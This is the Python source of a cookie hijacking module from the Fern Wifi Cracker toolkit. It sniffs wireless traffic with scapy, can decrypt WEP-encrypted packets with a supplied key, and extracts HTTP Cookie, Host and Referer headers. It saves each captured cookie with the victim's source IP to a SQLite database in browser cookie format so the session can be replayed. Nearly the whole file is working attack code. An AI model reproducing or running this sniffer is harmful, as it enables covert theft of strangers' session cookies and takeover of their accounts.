#-------------------------------------------------------------------------------
# Name:        Fern_Cookie_Hijacker
# Purpose:     Captures http cookies from wireless networks
#
# Author:      Saviour Emmanuel Ekiko
#
# Created:     14/06/2012
# Copyright:   (c) Fern Wifi Cracker 2012
# Licence:     <GNU GPL v3>
#
#
#-------------------------------------------------------------------------------
# GNU GPL v3 Licence Summary:
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

import re
import os
import time
import thread
import sqlite3
import logging
import threading

from PyQt4 import QtCore

from scapy.all import *

class Cookie_Hijack_Core(QtCore.QThread):
    def __init__(self):
        QtCore.QThread.__init__(self)
        self.control = True             # Starts or Stop Thread processes [True = Start,False = Stop]
        self.maximum_threads = 15        # Thread control -> Issue 30 (http://code.google.com/p/fern-wifi-cracker/issues/detail?id=30)
        self.monitor_interface = str()  # Interface to process 802.11 based packets e.g mon0
        self.decryption_key = str()     # Key to decrypt encrypted packets, if exists
        self.cookie_db_jar = object     # SQlite database for holding captured cookies
        self.cookie_db_cursor = object  # Cursor Object
        self.captured_cookie_count = 0  # Holds number of captured cookies

        self.semaphore = threading.BoundedSemaphore(self.maximum_threads)   # Thread control -> Issue 30 (http://code.google.com/p/fern-wifi-cracker/issues/detail?id=30)


    def __del__(self):
        typedef = type(self.cookie_db_jar).__name__
        if(typedef == "Connection"):
            self.cookie_db_jar.close()


    def truncate_database(self):        # Deltes all previous cookie entires from database
        sql_code = "delete from cookie_cache"
        self.cookie_db_cursor.execute(sql_code)
        self.cookie_db_jar.commit()


    def create_cookie_cache(self):      # Creates table cookie_cache for logging captured cookies
        sql_code_a = '''create table if not exists cookie_cache
        (source TEXT,Referer TEXT,Web_Address TEXT,
        Host TEXT,Name TEXT,Value TEXT,
        Dot_Host Text,Path TEXT,
        IsSecured INTEGER,IsHttpOnly INTEGER
        )'''
        sql_code_b = '''create table if not exists cache_settings
        (setting TEXT,value TEXT)'''

        self.cookie_db_cursor.execute(sql_code_a)
        self.cookie_db_cursor.execute(sql_code_b)
        self.cookie_db_jar.commit()


    def insert_cache_settings(self,setting,value):
        sql_code = "insert into cache_settings values (?,?)"
        self.cookie_db_cursor.execute(sql_code ,(setting,value))
        self.cookie_db_jar.commit()



    # Mozilla Cookie entry format
    #
    # ('14', 'scorecardresearch.com', 'UID', '2baec64d-23.63.99.90-1342553308', '.scorecardresearch.com', '/', '1404761306', '1342815702910000', '1342553306190000', '0', '0')
    # (id_number,baseDomain,name,value,host,path,expiry,lastAccessed,creationTime,isSecure,isHttpOnly)
    #

    def insert_Cookie_values(self,source,referer,web_address,host,name,value,dot_host,path,isSecure,isHttpOnly):
        sql_code_a = "select Value from cookie_cache where (source = ? and Web_Address = ? and Name = ?)"
        sql_code_b = "update cookie_cache set Value = ? where (Name = ? and source = ? and Web_Address = ?)"
        sql_code_c = "insert into cookie_cache values (?,?,?,?,?,?,?,?,?,?);"

        if(referer == str()):
            referer = "http://" + web_address

        if(referer.startswith("https://")):
            isSecure = "1"
        else:
            isSecure = "0"

        database_path = os.getcwd() + "/key-database/Cookie.db"
        cookie_db_jar = sqlite3.connect(database_path)

        cookie_db_cursor = cookie_db_jar.cursor()

        cookie_db_cursor.execute(sql_code_a ,(source,web_address,name))
        db_value = cookie_db_cursor.fetchone()
        if(db_value):
            if(db_value[0] != value):
                cookie_db_cursor.execute(sql_code_b ,(value,name,source,web_address))
                cookie_db_jar.commit()
                cookie_db_jar.close()
                return

        cookie_db_cursor.execute(sql_code_c,(source,referer,web_address,host,name,value,dot_host,path,isSecure,isHttpOnly))
        cookie_db_jar.commit()
        cookie_db_jar.close()


    def domain_process(self,domain):    # www.google.com --> .google.com | us.atlanta.google.co.uk --> .google.co.uk
        domain_string = str()
        process = []
        if(domain.startswith("ad.")):
            domain_string = domain
            return(domain)
        seg_domain = domain.split(".")
        seg_domain.reverse()
        for segment in seg_domain:
            if(len(segment) <= 3):
                process.append(segment)
                process.append(".")
            else:
                process.append(segment)
                process.append(".")
                break
        process.reverse()
        for segment in process:
            domain_string  += segment

        return(domain_string)


    def calculate_expiration_time(self):
        return


    def Process_Packet(self,captured_packet):
        self.semaphore.acquire()                        # Thread control -> Issue 30 (http://code.google.com/p/fern-wifi-cracker/issues/detail?id=30)
        try:
            path = r"/"
            expires = ""
            domain = str()
            web_address = str()
            refer_address = str()
            is_secure = str()
            src_addr = captured_packet.getlayer("IP").src       # Source Mac address

            if(self.control):
                self.emit(QtCore.SIGNAL("cookie buffer detected"))

            if("Cookie:" in captured_packet.load):

                if("Host:" in captured_packet.load):
                    http_packets = captured_packet.load.split("\n")

                    for entries in http_packets:
                        if(re.match("Referer",entries,re.IGNORECASE)):
                            process = entries.strip()
                            refer_address = process.split(":",1)[1]
                            if(refer_address.startswith("https://")):
                                is_secure = "1"
                            else:
                                is_secure = "0"

                        if(re.match("Host",entries,re.IGNORECASE)):
                            process = entries.strip()
                            web_address = process.split(":",1)[1]
                            domain = self.domain_process(web_address)              # www.google.com --> .google.com

                        if(re.match("Cookie",entries,re.IGNORECASE)):
                            process = entries.strip()
                            cookie_collection = process.split(":",1)[1]                        # "c_user=UYt6t6rTRf455ddt5; ID=8776765; env-tye=8927GTFYfYT;"

                            cookie_process = cookie_collection.split(";")

                            for cookie_and_value in cookie_process:
                                if(cookie_and_value):
                                    cookie_process_a = cookie_and_value.strip()
                                    if("=" in cookie_process_a):
                                        name,value = cookie_process_a.split("=",1)

                                        # source,referer,web_address,host,name,value,dot_host,path,isSecure,isHttpOnly
                                        self.insert_Cookie_values(src_addr,refer_address,web_address,domain[1:],name,value,domain,path,is_secure,"0")
                                        self.captured_cookie_count += 1

                    if(self.control):
                        self.emit(QtCore.SIGNAL("New Cookie Captured"))     # Notification Signal for GUI instance

        except AttributeError,message:
            pass

        finally:
            self.semaphore.release()                                    # Thread control -> Issue 30 (http://code.google.com/p/fern-wifi-cracker/issues/detail?id=30)



    def Cookie_Capture(self):
        sniff(filter = "tcp and port http or https",iface = self.monitor_interface,prn = self.Process_Packet,store = 0) # Thread worker speeds up packet processing


    def run(self):
        conf.wepkey = self.decryption_key
        self.Cookie_Capture()






























